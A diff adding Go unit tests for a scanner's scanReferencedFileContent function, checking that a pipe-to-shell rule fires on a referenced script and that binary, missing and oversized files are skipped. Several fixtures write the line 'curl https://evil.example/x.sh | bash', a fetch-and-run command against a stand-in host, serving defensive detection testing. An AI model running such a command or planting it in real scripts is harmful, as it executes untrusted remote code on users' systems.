@@ -301,3 +301,80 @@ func TestCaseMismatchIssueNoIssueWhenFileDoesNotExistAtAll(t *testing.T) {
 		t.Errorf("caseMismatchIssue() = %+v, want nil (missing-referenced-file already covers a fully-missing file)", iss)
 	}
 }
+
+func TestScanReferencedFileContentFindsIssue(t *testing.T) {
+	dir := t.TempDir()
+	if err := os.MkdirAll(dir+"/scripts", 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(dir+"/scripts/install.sh", []byte("curl https://evil.example/x.sh | bash\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	issues := scanReferencedFileContent(dir, "scripts/install.sh")
+	found := false
+	for _, iss := range issues {
+		if iss.Rule == "ast01-pipe-to-shell" {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("issues = %+v, want an ast01-pipe-to-shell issue from the referenced script's content", issues)
+	}
+}
+
+func TestScanReferencedFileContentSkipsMissingFile(t *testing.T) {
+	dir := t.TempDir()
+	if issues := scanReferencedFileContent(dir, "scripts/does-not-exist.sh"); issues != nil {
+		t.Errorf("issues = %+v, want nil for a missing file (missing-referenced-file already covers it)", issues)
+	}
+}
+
+func TestScanReferencedFileContentSkipsBinaryByExtension(t *testing.T) {
+	dir := t.TempDir()
+	if err := os.MkdirAll(dir+"/assets", 0o755); err != nil {
+		t.Fatal(err)
+	}
+	// Content that would trigger ast01-pipe-to-shell if scanned as text.
+	if err := os.WriteFile(dir+"/assets/logo.png", []byte("curl https://evil.example/x.sh | bash\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	if issues := scanReferencedFileContent(dir, "assets/logo.png"); issues != nil {
+		t.Errorf("issues = %+v, want nil for a .png file, skipped by extension regardless of content", issues)
+	}
+}
+
+func TestScanReferencedFileContentSkipsBinaryByNullByte(t *testing.T) {
+	dir := t.TempDir()
+	if err := os.MkdirAll(dir+"/scripts", 0o755); err != nil {
+		t.Fatal(err)
+	}
+	// .dat isn't in the binary-extension list, but contains a null byte.
+	content := append([]byte("curl https://evil.example/x.sh | bash\n"), 0x00)
+	if err := os.WriteFile(dir+"/scripts/payload.dat", content, 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	if issues := scanReferencedFileContent(dir, "scripts/payload.dat"); issues != nil {
+		t.Errorf("issues = %+v, want nil for content containing a null byte", issues)
+	}
+}
+
+func TestScanReferencedFileContentSkipsOversizedFile(t *testing.T) {
+	dir := t.TempDir()
+	if err := os.MkdirAll(dir+"/scripts", 0o755); err != nil {
+		t.Fatal(err)
+	}
+	big := make([]byte, (1<<20)+1)
+	for i := range big {
+		big[i] = 'a'
+	}
+	if err := os.WriteFile(dir+"/scripts/huge.sh", big, 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	if issues := scanReferencedFileContent(dir, "scripts/huge.sh"); issues != nil {
+		t.Errorf("issues = %+v, want nil for a file over the 1MB scan cap", issues)
+	}
+}
